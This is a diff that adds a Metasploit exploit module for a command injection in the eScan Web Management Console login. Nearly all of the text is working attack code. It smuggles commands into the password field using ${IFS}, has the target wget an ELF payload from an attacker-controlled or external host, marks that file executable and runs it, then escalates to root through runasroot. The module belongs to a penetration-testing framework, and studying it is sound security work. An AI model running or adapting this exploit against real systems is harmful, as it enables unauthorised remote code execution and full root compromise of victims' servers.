@@ -1,0 +1,167 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "eScan Web Management Console Command Injection",
+      'Description'    => %q{
+        This module exploits a command injection vulnerability found in the eScan Web Management
+        Console. The vulnerability exists while processing CheckPass login requests. An attacker
+        with a valid username can use a malformed password to execute arbitrary commands. With
+        mwconf privileges, the runasroot utility can be abused to get root privileges. This module
+        has been tested successfully on eScan 5.5-2 on Ubuntu 12.04.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Joxean Koret', # Vulnerability Discovery and PoC
+          'juan vazquez' # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'http://www.joxeankoret.com/download/breaking_av_software-pdf.tar.gz' ] # Syscan slides by Joxean
+        ],
+      'Payload'        =>
+        {
+          'BadChars'    => "", # Real bad chars when injecting: "|&)(!><'\"` ", cause of it we're avoiding ARCH_CMD
+          'DisableNops' => true
+        },
+      'Arch'           => ARCH_X86,
+      'Platform'       => 'linux',
+      'Privileged'     => true,
+      'Stance'         => Msf::Exploit::Stance::Aggressive,
+      'Targets'        =>
+        [
+          ['eScan 5.5-2 / Linux', {}],
+        ],
+      'DisclosureDate' => "Apr 04 2014",
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        Opt::RPORT(10080),
+        OptString.new('USERNAME', [ true, 'A valid eScan username' ]),
+        OptString.new('TARGETURI', [true, 'The base path to the eScan Web Administration console', '/']),
+        OptString.new('EXTURL', [ false, 'An alternative host to request the EXE payload from' ]),
+        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10]),
+        OptString.new('WRITABLEDIR', [ true, 'A directory where we can write files', '/tmp' ]),
+        OptString.new('RUNASROOT', [ true, 'Path to the runasroot binary', '/opt/MicroWorld/sbin/runasroot' ]),
+      ], self.class)
+  end
+
+
+  def check
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path.to_s, 'index.php')
+    })
+
+    if res and res.code == 200 and res.body =~ /eScan WebAdmin/
+      return Exploit::CheckCode::Detected
+    end
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def cmd_exec(session, cmd)
+    case session.type
+    when /meterpreter/
+      print_warning("#{peer} - Use a shell payload in order to get root!")
+    when /shell/
+      o = session.shell_command_token(cmd)
+      o.chomp! if o
+    end
+    return "" if o.nil?
+    return o
+  end
+
+  # Escalating privileges here because runasroot only can't be executed by
+  # mwconf uid (196).
+  def on_new_session(session)
+    cmd_exec(session, "#{datastore['RUNASROOT'].shellescape} /bin/sh")
+    super
+  end
+
+  def primer
+    @payload_url = get_uri
+    wget_payload
+  end
+
+  def on_request_uri(cli, request)
+    print_status("Request: #{request.uri}")
+    if request.uri =~ /#{Regexp.escape(get_resource)}/
+      print_status("Sending payload...")
+      send_response(cli, @pl)
+    end
+  end
+
+  def exploit
+    @pl           = generate_payload_exe
+    if @pl.blank?
+      fail_with(Failure::BadConfig, "#{peer} - Failed to generate the ELF, select a native payload")
+    end
+    @payload_url  = ""
+
+    if datastore['EXTURL'].blank?
+      begin
+        Timeout.timeout(datastore['HTTPDELAY']) {super}
+      rescue Timeout::Error
+      end
+      exec_payload
+    else
+      @payload_url = datastore['EXTURL']
+      wget_payload
+      exec_payload
+    end
+  end
+
+  # we execute in this way, instead of an ARCH_CMD
+  # payload because real badchars are: |&)(!><'"`[space]
+  def wget_payload
+    @dropped_elf = rand_text_alpha(rand(5) + 3)
+    command = "wget${IFS}#{@payload_url}${IFS}-O${IFS}#{File.join(datastore['WRITABLEDIR'], @dropped_elf)}"
+
+    print_status("#{peer} - Downloading the payload to the target machine...")
+    res = exec_command(command)
+    if res && res.code == 302 && res.headers['Location'] && res.headers['Location'] =~ /index\.php\?err_msg=password/
+      register_files_for_cleanup(File.join(datastore['WRITABLEDIR'], @dropped_elf))
+    else
+      fail_with(Failure::Unknown, "#{peer} - Failed to download the payload to the target")
+    end
+  end
+
+  def exec_payload
+    command = "chmod${IFS}777${IFS}#{File.join(datastore['WRITABLEDIR'], @dropped_elf)};"
+    command << File.join(datastore['WRITABLEDIR'], @dropped_elf)
+
+    print_status("#{peer} - Executing the payload...")
+    exec_command(command, 1)
+  end
+
+  def exec_command(command, timeout=20)
+    send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path.to_s, 'login.php'),
+      'vars_post' => {
+        'uname' => datastore['USERNAME'],
+        'pass' => ";#{command}",
+        'product_name' => 'escan',
+        'language' => 'English',
+        'login' => 'Login'
+      }
+    }, timeout)
+  end
+
+end
